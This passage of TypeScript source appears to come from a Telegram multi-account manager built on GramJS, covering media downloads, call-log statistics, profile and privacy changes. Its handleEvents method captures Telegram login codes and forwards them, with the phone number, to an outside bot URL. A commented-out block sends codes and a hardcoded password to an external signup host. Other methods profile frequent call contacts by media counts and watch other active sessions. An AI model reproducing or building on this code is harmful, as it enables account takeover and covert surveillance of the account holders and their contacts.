                const sizes = (<Api.Photo>message.photo)?.sizes || [];
                if (sizes.length > 0) {
                    const preferredSize = sizes.find((s: any) => s.type === 'm') ||
                        sizes.find((s: any) => s.type === 'x') ||
                        sizes[sizes.length - 1] ||
                        sizes[0];
                    return await this.downloadWithTimeout(
                        this.client.downloadMedia(message, { thumb: preferredSize }) as any,
                        30000
                    );
                }
            } else if (message.media instanceof Api.MessageMediaDocument) {
                const thumbs = message.document?.thumbs || [];
                if (thumbs.length > 0) {
                    const preferredThumb = thumbs.find((t: any) => t.type === 'm') ||
                        thumbs[thumbs.length - 1] ||
                        thumbs[0];
                    return await this.downloadWithTimeout(
                        this.client.downloadMedia(message, { thumb: preferredThumb }) as any,
                        30000
                    );
                }
            }
        } catch (error) {
            this.logger.warn(this.phoneNumber, `Failed to get thumbnail for message ${message.id}:`, error);
        }
        return null;
    }

    /**
     * Get message with media validation (reusable method)
     * @param messageId - Message ID
     * @param chatId - Chat ID
     * @returns Message with media or throws error
     */
    private async getMessageWithMedia(messageId: number, chatId: string): Promise<Api.Message> {
        const entity = await this.safeGetEntity(chatId);
        const messages = await this.client.getMessages(entity, { ids: [messageId] });
        const message = <Api.Message>messages[0];

        if (!message || message.media instanceof Api.MessageMediaEmpty) {
            throw new Error('Media not found');
        }

        return message;
    }

    /**
     * Get media file information for download (reusable method)
     * @param message - Message with media
     * @returns Media file info or throws error
     */
    private getMediaFileInfo(message: Api.Message): {
        contentType: string;
        filename: string;
        fileLocation: Api.TypeInputFileLocation;
        fileSize: number;
        inputLocation: Api.Photo | Api.Document;
    } {
        const media = message.media;
        let contentType: string;
        let filename: string;
        let fileLocation: Api.TypeInputFileLocation;
        let fileSize = 0;
        let inputLocation: Api.Photo | Api.Document;

        if (media instanceof Api.MessageMediaPhoto) {
            const photo = message.photo as Api.Photo;
            if (!photo || photo instanceof Api.PhotoEmpty) {
                throw new Error('Photo not found in message');
            }
            inputLocation = photo;
            contentType = 'image/jpeg';
            filename = 'photo.jpg';

            const data = {
                id: photo.id,
                accessHash: photo.accessHash,
                fileReference: photo.fileReference,
            };

            fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });

            const sizes = photo?.sizes || [];
            const largestSize = sizes[sizes.length - 1];
            if (largestSize && 'size' in largestSize) {
                fileSize = (largestSize as any).size || 0;
            }
        } else if (media instanceof Api.MessageMediaDocument) {
            const document = media.document;
            if (!document || document instanceof Api.DocumentEmpty) {
                throw new Error('Document not found in message');
            }

            if (!(document instanceof Api.Document)) {
                throw new Error('Document format not supported');
            }

            inputLocation = document;
            const fileNameAttr = document.attributes?.find(
                attr => attr instanceof Api.DocumentAttributeFilename
            ) as Api.DocumentAttributeFilename;

            filename = fileNameAttr?.fileName || 'document.bin';
            contentType = document.mimeType || this.detectContentType(filename);
            fileSize = typeof document.size === 'number' ? document.size : (document.size ? Number(document.size.toString()) : 0);

            const data = {
                id: document.id,
                accessHash: document.accessHash,
                fileReference: document.fileReference,
            };

            fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
        } else {
            throw new Error('Unsupported media type');
        }

        return {
            contentType,
            filename,
            fileLocation,
            fileSize,
            inputLocation
        };
    }

    async sendInlineMessage(chatId: string, message: string, url: string) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new Api.KeyboardButtonUrl(button)]
        })
        return result;
    }

    async getMediaMessages() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhotos(),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );
        return result
    }


    /**
     * Get call log statistics with enhanced accuracy and reliability
     * Uses messages.Search with InputMessagesFilterPhoneCalls for server-side filtering
     * This is more efficient than fetching all messages and filtering client-side
     * @param limit - Maximum number of calls to fetch (default: 1000, max: 10000)
     * @returns Comprehensive call statistics including per-chat breakdowns
     */
    async getCallLog(limit: number = 1000): Promise<{
        outgoing: number;
        incoming: number;
        video: number;
        audio: number;
        chatCallCounts: Array<{
            chatId: string;
            phone?: string;
            username?: string;
            name: string;
            count: number;
            msgs?: number;
            video?: number;
            photo?: number;
            peerType: 'user' | 'group' | 'channel';
        }>;
        totalCalls: number;
        analyzedCalls: number;
    }> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const maxLimit = Math.min(Math.max(limit, 1), 10000);
            let analyzedCalls = 0;

            const filteredResults = {
                outgoing: 0,
                incoming: 0,
                video: 0,
                audio: 0,
                chatCallCounts: {} as Record<string, {
                    phone?: string;
                    username?: string;
                    name: string;
                    count: number;
                    peerType: 'user' | 'group' | 'channel';
                }>,
                totalCalls: 0
            };

            // Use messages.Search with InputMessagesFilterPhoneCalls filter
            // This performs server-side filtering, which is much more efficient than
            // fetching all messages and filtering client-side
            // The API returns only call messages, reducing bandwidth and processing time
            const result = <Api.messages.Messages>await this.client.invoke(
                new Api.messages.Search({
                    peer: new Api.InputPeerEmpty(), // Search all chats
                    q: '', // Empty query to get all calls
                    filter: new Api.InputMessagesFilterPhoneCalls({}), // Server-side filter for calls only
                    minDate: 0,
                    maxDate: 0,
                    offsetId: 0,
                    addOffset: 0,
                    limit: maxLimit, // Request only what we need
                    maxId: 0,
                    minId: 0,
                    hash: bigInt(0),
                })
            );

            const callLogs = <Api.Message[]>result.messages.filter(
                (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
            );

            // Process each call log - batch entity fetching for better performance
            const entityCache = new Map<string, { name: string; phone?: string; username?: string; peerType: 'user' | 'group' | 'channel' }>();

            for (const log of callLogs) {
                if (analyzedCalls >= maxLimit) break;

                try {
                    if (!log.action || !(log.action instanceof Api.MessageActionPhoneCall)) {
                        continue;
                    }

                    filteredResults.totalCalls++;
                    analyzedCalls++;
                    const logAction = <Api.MessageActionPhoneCall>log.action;

                    // Categorize by direction
                    if (log.out) {
                        filteredResults.outgoing++;
                    } else {
                        filteredResults.incoming++;
                    }

                    // Categorize by call type
                    if (logAction.video) {
                        filteredResults.video++;
                    } else {
                        filteredResults.audio++;
                    }

                    // Extract chat ID - handle different peer types
                    let chatId: string;
                    let peerType: 'user' | 'group' | 'channel' = 'user';

                    if (log.peerId instanceof Api.PeerUser) {
                        chatId = log.peerId.userId.toString();
                        peerType = 'user';
                    } else if (log.peerId instanceof Api.PeerChat) {
                        chatId = log.peerId.chatId.toString();
                        peerType = 'group';
                    } else if (log.peerId instanceof Api.PeerChannel) {
                        chatId = log.peerId.channelId.toString();
                        peerType = 'channel';
                    } else {
                        // Unknown peer type, skip
                        const peerTypeName = (log.peerId as any)?.className || 'Unknown';
                        this.logger.warn(this.phoneNumber, `Unknown peer type in call log: ${peerTypeName}`);
                        continue;
                    }

                    // Initialize chat entry if not exists - use cache to avoid duplicate entity fetches
                    if (!filteredResults.chatCallCounts[chatId]) {
                        if (!entityCache.has(chatId)) {
                            try {
                                const entity = await this.safeGetEntity(chatId);

                                if (entity instanceof Api.User) {
                                    entityCache.set(chatId, {
                                        phone: entity.phone,
                                        username: entity.username,
                                        name: `${entity.firstName || ''} ${entity.lastName || ''}`.trim() || 'Unknown',
                                        peerType: 'user'
                                    });
                                } else if (entity instanceof Api.Chat) {
                                    entityCache.set(chatId, {
                                        name: entity.title || 'Unknown Group',
                                        peerType: 'group'
                                    });
                                } else if (entity instanceof Api.Channel) {
                                    entityCache.set(chatId, {
                                        username: entity.username,
                                        name: entity.title || 'Unknown Channel',
                                        peerType: 'channel'
                                    });
                                } else {
                                    // Fallback for unknown entity types
                                    entityCache.set(chatId, {
                                        name: 'Unknown',
                                        peerType
                                    });
                                }
                            } catch (entityError) {
                                // If entity fetch fails, use fallback
                                this.logger.warn(this.phoneNumber, `Failed to get entity for chatId ${chatId}:`, entityError);
                                entityCache.set(chatId, {
                                    name: 'Unknown',
                                    peerType
                                });
                            }
                        }

                        const cachedEntity = entityCache.get(chatId)!;
                        filteredResults.chatCallCounts[chatId] = {
                            ...cachedEntity,
                            count: 0
                        };
                    }

                    filteredResults.chatCallCounts[chatId].count++;
                } catch (logError) {
                    this.logger.warn(this.phoneNumber, 'Error processing call log entry:', logError);
                    // Continue processing other calls
                }
            }

            // Process chat call counts - get additional info for chats with >4 calls
            const filteredChatCallCounts: Array<{
                chatId: string;
                phone?: string;
                username?: string;
                name: string;
                count: number;
                msgs?: number;
                video?: number;
                photo?: number;
                peerType: 'user' | 'group' | 'channel';
            }> = [];

            for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
                if (details.count > 4) {
                    try {
                        let video = 0;
                        let photo = 0;
                        let totalMsgs = 0;
                        const maxMessagesToAnalyze = 600;

                        // Use iterMessages for memory-efficient message processing
                        // This processes messages one at a time instead of loading 600 into memory
                        let messageCount = 0;
                        for await (const message of this.client.iterMessages(chatId, {
                            limit: maxMessagesToAnalyze,
                            reverse: false
                        })) {
                            messageCount++;

                            // Skip movie-related messages early for performance
                            if (message.text) {
                                const text = message.text.toLowerCase();
                                if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                                    continue;
                                }
                            }

                            // Count media - only check if message has media
                            if (message.media && !(message.media instanceof Api.MessageMediaEmpty)) {
                                if (message.media instanceof Api.MessageMediaPhoto) {
                                    photo++;
                                } else if (message.media instanceof Api.MessageMediaDocument) {
                                    const document = message.media.document;
                                    if (document instanceof Api.Document) {
                                        const isVideo = document.attributes.some(
                                            attr => attr instanceof Api.DocumentAttributeVideo
                                        );
                                        const isImage = document.mimeType?.startsWith('image/');
                                        if (isVideo) {
                                            video++;
                                        } else if (isImage) {
                                            photo++;
                                        }
                                    }
                                }
                            }
                        }
                        totalMsgs = messageCount;

                        filteredChatCallCounts.push({
                            chatId,
                            ...details,
                            msgs: totalMsgs,
                            video,
                            photo
                        });
                    } catch (msgError) {
                        // If message fetch fails, still include the chat with basic info
                        this.logger.warn(this.phoneNumber, `Failed to get messages for chatId ${chatId}:`, msgError);
                        filteredChatCallCounts.push({
                            chatId,
                            ...details
                        });
                    }
                }
            }

            // Sort by call count (descending)
            filteredChatCallCounts.sort((a, b) => b.count - a.count);

            this.logger.info(this.phoneNumber, 'CallLog completed:', {
                totalCalls: filteredResults.totalCalls,
                analyzedCalls,
                outgoing: filteredResults.outgoing,
                incoming: filteredResults.incoming,
                video: filteredResults.video,
                audio: filteredResults.audio,
                chatCount: filteredChatCallCounts.length
            });

            return {
                outgoing: filteredResults.outgoing,
                incoming: filteredResults.incoming,
                video: filteredResults.video,
                audio: filteredResults.audio,
                chatCallCounts: filteredChatCallCounts,
                totalCalls: filteredResults.totalCalls,
                analyzedCalls
            };
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error in getCallLog:', error);
            throw error;
        }
    }

    async getCallLogsInternal(maxCalls: number = 300) {
        const finalResult: Record<string, { outgoing: number, incoming: number, video: number, totalCalls: number }> = {};
        const chunkSize = 100;
        let offsetId = 0;
        let totalFetched = 0;

        while (totalFetched < maxCalls) {
            const result = <Api.messages.Messages>await this.client.invoke(
                new Api.messages.Search({
                    peer: new Api.InputPeerEmpty(),
                    q: '',
                    filter: new Api.InputMessagesFilterPhoneCalls({}),
                    minDate: 0,
                    maxDate: 0,
                    offsetId,
                    addOffset: 0,
                    limit: chunkSize,
                    maxId: 0,
                    minId: 0,
                    hash: bigInt(0),
                })
            );

            const messages = result.messages || [];
            if (messages.length === 0) break;

            for (const log of messages) {
                if (!(log instanceof Api.Message) || !(log.action instanceof Api.MessageActionPhoneCall)) continue;
                if (!log.peerId || !(log.peerId instanceof Api.PeerUser)) continue;

                const chatId = log.peerId.userId.toString();
                if (!finalResult[chatId]) {
                    finalResult[chatId] = { outgoing: 0, incoming: 0, video: 0, totalCalls: 0 };
                }

                const stats = finalResult[chatId];
                stats.totalCalls++;
                if (log.out) stats.outgoing++;
                else stats.incoming++;
                if ((log.action as Api.MessageActionPhoneCall).video) stats.video++;
            }

            totalFetched += messages.length;
            if (messages.length < chunkSize) break;
            const lastMsg = messages[messages.length - 1];
            offsetId = lastMsg.id ?? 0;
        }

        return finalResult;
    }
    async handleEvents(event: NewMessageEvent) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                this.logger.info(this.phoneNumber, event.message.text.toLowerCase());
                this.logger.info(this.phoneNumber, `Login Code received for - ${this.phoneNumber}\nActiveClientSetup - TelegramManager.activeClientSetup`);
                this.logger.info(this.phoneNumber, "Date :", new Date(event.message.date * 1000))
                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {
                //     this.logger.info( this.phoneNumber, "LoginText: ", event.message.text)
                //     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                //     this.logger.info( this.phoneNumber, "Code is:", code);
                //     try {
                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                //         this.logger.info( this.phoneNumber, "Code Sent back");
                //     } catch (error) {
                //         parseError(error)
                //     }
                // } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
                // await event.message.delete({ revoke: true });
                // }
            }
        }
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll(),
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            this.logger.info(this.phoneNumber, "LAstSeen Updated")
        }
        catch (e) {
            throw e
        }
    }
    async updateProfile(firstName: string, about: string) {
        const data = {
            lastName: "",
        }
        if (firstName !== undefined) {
            data["firstName"] = firstName
        }
        if (about !== undefined) {
            data["about"] = about
        }
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile(data)
            );
            this.logger.info(this.phoneNumber, "Updated NAme: ", firstName);
        } catch (error) {
            throw error
        }
    }

    async downloadProfilePic(photoIndex: number) {
        try {
            const photos = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: 'me',
                    offset: 0,
                })
            );

            if (photos.photos.length > 0) {
                this.logger.info(this.phoneNumber, `You have ${photos.photos.length} profile photos.`);

                // Choose the photo index (0-based)
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];

                    // Extract the largest photo file (e.g., highest resolution)
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)
                    const photoFileSize = selectedPhoto.sizes[index];

                    // Download the file
                    const photoBuffer = await this.client.downloadFile(
                        new Api.InputPhotoFileLocation({
                            id: selectedPhoto.id,
                            accessHash: selectedPhoto.accessHash,
                            fileReference: selectedPhoto.fileReference,
                            thumbSize: photoFileSize.type
                        }), {
                        dcId: selectedPhoto.dcId, // Data center ID
                    });

                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        this.logger.info(this.phoneNumber, `Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    } else {
                        this.logger.info(this.phoneNumber, "Failed to download the photo.");
                    }
                } else {
                    this.logger.info(this.phoneNumber, `Photo index ${photoIndex} is out of range.`);
                }
            } else {
                this.logger.info(this.phoneNumber, "No profile photos found.");
            }
        } catch (err) {
            this.logger.error(this.phoneNumber, "Error:", err);
        }
    }
    /**
     * Get the last active time from other authorized sessions
     * Returns the most recent activity date from non-own sessions
     * @returns ISO date string (YYYY-MM-DD) of last active time, or current date if no other sessions
     */
    async getLastActiveTime(): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const result = await this.client.invoke(new Api.account.GetAuthorizations());
            let latest = 0;

            // Use forEach instead of map since we're not returning anything
            result.authorizations.forEach((auth) => {
                if (!this.isAuthMine(auth)) {
                    if (auth.dateActive && latest < auth.dateActive) {
                        latest = auth.dateActive;
                    }
                }
            });

            // If no other sessions found, return current date
            if (latest === 0) {
                return new Date().toISOString().split('T')[0];
            }

            return new Date(latest * 1000).toISOString().split('T')[0];
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting last active time:', error);
            // Return current date as fallback
            return new Date().toISOString().split('T')[0];
        }
    }

    async getContacts() {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({
                hash: bigInt(0)
            }));
            return exportedContacts;
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error getting contacts:', error);
            throw error;
        }
    }

    async deleteChat(params: {
        peer: string | Api.TypeInputPeer;
        maxId?: number;
        justClear?: boolean;
        revoke?: boolean;
        minDate?: number;
        maxDate?: number;
    }) {
        try {
            await this.client.invoke(new Api.messages.DeleteHistory(params));
            this.logger.info(this.phoneNumber, `Dialog with ID ${params.peer} has been deleted.`);
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Failed to delete dialog:', error);
        }
    }

    async blockUser(chatId: string) {
        try {
            await this.client?.invoke(new Api.contacts.Block({
                id: chatId,
            }));
            this.logger.info(this.phoneNumber, `User with ID ${chatId} has been blocked.`);
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Failed to block user:', error);
        }
    }

    async getMediaMetadata(params: {
        chatId: string;
        types?: ('photo' | 'video' | 'document' | 'voice' | 'all')[];
        startDate?: Date;
        endDate?: Date;
        limit?: number;
        maxId?: number;
        minId?: number;
    }) {
        if (!this.client) throw new Error('Client not initialized');

        let {
            chatId,
            types = ['photo', 'video', 'document'],
            startDate,
            endDate,
            limit = 50,
            maxId,
            minId
        } = params;

        // If "all" is in types, expand to all types and mark for grouping
        const hasAll = types.includes('all');
        const typesToFetch: ('photo' | 'video' | 'document' | 'voice')[] = hasAll
            ? ['photo', 'video', 'document', 'voice']
            : types.filter(t => t !== 'all') as ('photo' | 'video' | 'document' | 'voice')[];

        // When "all" is requested, fetch more messages to ensure we have enough for each type
        const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);

        const query: Partial<IterMessagesParams> = {
            limit: queryLimit,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {
                minDate: Math.floor(startDate.getTime() / 1000)
            }),
            ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {
                maxDate: Math.floor(endDate.getTime() / 1000)
            })
        };

        const ent = await this.safeGetEntity(chatId);
        this.logger.info(this.phoneNumber, "getMediaMetadata", params);
        const messages = await this.client.getMessages(ent, query);
        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);

        const filteredMessages = messages
            .filter(message => {
                if (!message.media) return false;
                const mediaType = this.getMediaType(message.media);
                return typesToFetch.includes(mediaType);
            })
            .map(message => {
                const mediaType = this.getMediaType(message.media);
                let fileSize: number | undefined;
                let mimeType: string | undefined;
                let filename: string | undefined;
                let width: number | undefined;
                let height: number | undefined;
                let duration: number | undefined;

                // Extract media details
                if (message.media instanceof Api.MessageMediaPhoto) {
                    const photo = message.photo as Api.Photo;
                    mimeType = 'image/jpeg'; // Default for photos
                    filename = 'photo.jpg'; // Default filename

                    if (photo?.sizes && photo.sizes.length > 0) {
                        const largestSize = photo.sizes[photo.sizes.length - 1];
                        if (largestSize && 'size' in largestSize) {
                            fileSize = (largestSize as any).size;
                        }
                        // Extract width and height from photo sizes
                        if (largestSize && 'w' in largestSize) {
                            width = (largestSize as any).w;
                        }
                        if (largestSize && 'h' in largestSize) {
                            height = (largestSize as any).h;
                        }
                    }
                } else if (message.media instanceof Api.MessageMediaDocument) {
                    const doc = message.media.document;
                    if (doc instanceof Api.Document) {
                        fileSize = typeof doc.size === 'number' ? doc.size : (doc.size ? Number(doc.size.toString()) : undefined);
                        mimeType = doc.mimeType;

                        const fileNameAttr = doc.attributes?.find(
                            attr => attr instanceof Api.DocumentAttributeFilename
                        ) as Api.DocumentAttributeFilename;
                        filename = fileNameAttr?.fileName;

                        const videoAttr = doc.attributes?.find(
                            attr => attr instanceof Api.DocumentAttributeVideo
                        ) as Api.DocumentAttributeVideo;
                        if (videoAttr) {
                            width = videoAttr.w;
                            height = videoAttr.h;
                            duration = videoAttr.duration;
                        }

                        const audioAttr = doc.attributes?.find(
                            attr => attr instanceof Api.DocumentAttributeAudio
                        ) as Api.DocumentAttributeAudio;
                        if (audioAttr && !duration) {
                            duration = audioAttr.duration;
                        }
                    }
                }

                // Handle date - can be Date object or number (Unix timestamp)
                let dateValue: number;
                const msgDate = message.date;
                if (msgDate) {
                    if (typeof msgDate === 'number') {
                        dateValue = msgDate;
                    } else if (typeof msgDate === 'object' && msgDate !== null && 'getTime' in msgDate) {
                        const dateObj = msgDate as { getTime: () => number };
                        dateValue = Math.floor(dateObj.getTime() / 1000);
                    } else {
                        dateValue = Math.floor(Date.now() / 1000);
                    }
                } else {
                    dateValue = Math.floor(Date.now() / 1000);
                }

                return {
                    messageId: message.id,
                    chatId: chatId,
                    type: mediaType,
                    date: dateValue,
                    caption: message.message || '',
                    fileSize,
                    mimeType,
                    filename,
                    width,
                    height,
                    duration,
                    mediaDetails: undefined
                };
            });

        // Group by type if "all" was requested
        if (hasAll) {
            const grouped = filteredMessages.reduce((acc, item) => {
                if (!acc[item.type]) {
                    acc[item.type] = [];
                }
                acc[item.type].push(item);
                return acc;
            }, {} as Record<string, typeof filteredMessages>);

            // Create groups with pagination for each type
            const groups = typesToFetch.map(mediaType => {
                const items = (grouped[mediaType] || []).slice(0, limit);
                const typeTotal = items.length;
                const typeHasMore = grouped[mediaType]?.length > limit;
                const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;
                const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;
                const typeNextMaxId = typeHasMore ? typeLastMessageId : undefined;

                return {
                    type: mediaType,
                    count: typeTotal,
                    items: items,
                    pagination: {
                        page: 1,
                        limit,
                        total: typeTotal,
                        totalPages: typeHasMore ? -1 : 1,
                        hasMore: typeHasMore,
                        nextMaxId: typeNextMaxId,
                        firstMessageId: typeFirstMessageId,
                        lastMessageId: typeLastMessageId
                    }
                };
            });

            // Overall pagination (based on all messages fetched)
            const totalItems = filteredMessages.length;
            const overallHasMore = messages.length === queryLimit && messages.length > 0;
            const overallFirstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;
            const overallLastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;
            const overallNextMaxId = overallHasMore ? overallLastMessageId : undefined;
            const overallPrevMaxId = maxId && filteredMessages.length > 0 ? overallFirstMessageId : undefined;

            return {
                groups,
                pagination: {
                    page: 1,
                    limit,
                    total: totalItems,
                    totalPages: overallHasMore ? -1 : 1,
                    hasMore: overallHasMore,
                    nextMaxId: overallNextMaxId,
                    prevMaxId: overallPrevMaxId,
                    firstMessageId: overallFirstMessageId,
                    lastMessageId: overallLastMessageId
                },
                filters: {
                    chatId,
                    types: ['all'],
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        } else {
            // Single or multiple types without grouping - return as array
            const total = filteredMessages.length;
            const hasMore = messages.length === queryLimit && messages.length > 0;
            const firstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;
            const lastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;
            const nextMaxId = hasMore ? lastMessageId : undefined;
            // Calculate prevMaxId: if we have a maxId in query, we can go back, otherwise null
            const prevMaxId = maxId && filteredMessages.length > 0 ? firstMessageId : undefined;

            return {
                data: filteredMessages,
                pagination: {
                    page: 1,
                    limit,
                    total,
                    totalPages: hasMore ? -1 : 1,
                    hasMore,
                    nextMaxId,
                    prevMaxId,
                    firstMessageId,
                    lastMessageId
                },
                filters: {
                    chatId,
                    types: typesToFetch,
                    startDate: startDate?.toISOString(),
                    endDate: endDate?.toISOString()
                }
            };
        }
    }

    /**
     * Get thumbnail buffer for a message
     * @param messageId - Message ID
     * @param chatId - Chat ID
     * @returns Thumbnail buffer and metadata
     */
    async getThumbnail(messageId: number, chatId: string = 'me'): Promise<{
        buffer: Buffer;
        etag: string;
        contentType: string;
        filename: string;
    }> {
        const message = await this.getMessageWithMedia(messageId, chatId);
        const thumbBuffer = await this.getThumbnailBuffer(message);

        if (!thumbBuffer) {
            throw new Error('Thumbnail not available for this media');
        }

        const etag = this.generateETag(messageId, chatId, `thumb-${messageId}`);

        return {
            buffer: thumbBuffer,
            etag,
            contentType: 'image/jpeg',
            filename: `thumbnail_${messageId}.jpg`
        };
    }

    /**
     * Get media file download information
     * @param messageId - Message ID
     * @param chatId - Chat ID
     * @returns Media file info for streaming/download
     */
    async getMediaFileDownloadInfo(messageId: number, chatId: string = 'me'): Promise<{
        fileLocation: Api.TypeInputFileLocation;
        contentType: string;
        filename: string;
        fileSize: number;
        etag: string;
        inputLocation: Api.Photo | Api.Document;
    }> {
        const message = await this.getMessageWithMedia(messageId, chatId);
        const fileInfo = this.getMediaFileInfo(message);

        const fileId = typeof fileInfo.inputLocation.id === 'object'
            ? fileInfo.inputLocation.id.toString()
            : fileInfo.inputLocation.id;
        const etag = this.generateETag(messageId, chatId, fileId);

        return {
            ...fileInfo,
            etag
        };
    }

    /**
     * Stream media file chunks (for download)
     * @param fileLocation - File location from getMediaFileDownloadInfo
     * @param offset - Byte offset to start from
     * @param limit - Maximum bytes to read
     * @param requestSize - Chunk size for requests
     * @returns Async generator of Buffer chunks
     */
    async *streamMediaFile(
        fileLocation: Api.TypeInputFileLocation,
        offset: bigInt.BigInteger = bigInt(0),
        limit: number = 5 * 1024 * 1024,
        requestSize: number = 512 * 1024
    ): AsyncGenerator<Buffer> {
        for await (const chunk of this.client.iterDownload({
            file: fileLocation,
            offset,
            limit,
            requestSize,
        })) {
            yield chunk;
        }
    }

    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {
        return Promise.race([
            promise,
            new Promise<T>((_, reject) =>
                setTimeout(() => reject(new Error('Download timeout')), timeout)
            )
        ]);
    }

    /**
     * Process items with controlled concurrency to respect rate limits
     * Processes items in batches with a concurrency limit (default: 3)
     * Based on Telegram best practices: https://gram.js.org/beta/interfaces/client.telegramBaseClient.TelegramClientParams.html
     */
    private async processWithConcurrencyLimit<T, R>(
        items: T[],
        processor: (item: T) => Promise<R>,
        concurrencyLimit: number = this.THUMBNAIL_CONCURRENCY_LIMIT,
        batchDelay: number = this.THUMBNAIL_BATCH_DELAY_MS
    ): Promise<R[]> {
        const results: R[] = [];
        const errors: Error[] = [];

        // Process items in batches
        for (let i = 0; i < items.length; i += concurrencyLimit) {
            const batch = items.slice(i, i + concurrencyLimit);

            // Process batch concurrently
            const batchResults = await Promise.allSettled(
                batch.map(item => processor(item))
            );

            // Collect results and errors
            for (const result of batchResults) {
                if (result.status === 'fulfilled') {
                    results.push(result.value);
                } else {
                    errors.push(result.reason);
                }
            }

            // Add delay between batches (except after last batch)
            if (i + concurrencyLimit < items.length && batchDelay > 0) {
                await new Promise(resolve => setTimeout(resolve, batchDelay));
            }
        }

        // Log errors if any occurred
        if (errors.length > 0) {
            this.logger.warn(
                this.phoneNumber,
                `Completed processing with ${errors.length} errors out of ${items.length} items`
            );
        }

        return results;
    }

    private getMediaDetails(media: Api.MessageMediaDocument) {
        if (!media?.document) return null;

        const doc = media.document;
        if (doc instanceof Api.DocumentEmpty) return null;
        const videoAttr = doc.attributes.find(attr =>
            attr instanceof Api.DocumentAttributeVideo
        ) as Api.DocumentAttributeVideo;

        const fileNameAttr = doc.attributes.find(attr =>
            attr instanceof Api.DocumentAttributeFilename
        ) as Api.DocumentAttributeFilename;

        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }

    /**
     * Download file from URL to buffer with size validation and better error handling
     * @param url - URL to download from
     * @param maxSize - Maximum file size in bytes (default: 100MB)
     * @returns Buffer containing file data
     */
    private async downloadFileFromUrl(url: string, maxSize: number = this.MAX_FILE_SIZE): Promise<Buffer> {
        try {
            // First, check file size with HEAD request
            const headResponse = await axios.head(url, {
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                validateStatus: (status) => status >= 200 && status < 400
            });

            const contentLength = parseInt(headResponse.headers['content-length'] || '0', 10);
            if (contentLength > maxSize) {
                throw new Error(`File size ${contentLength} exceeds maximum ${maxSize} bytes`);
            }

            const response = await axios.get(url, {
                responseType: 'arraybuffer',
                timeout: this.FILE_DOWNLOAD_TIMEOUT,
                maxContentLength: maxSize,
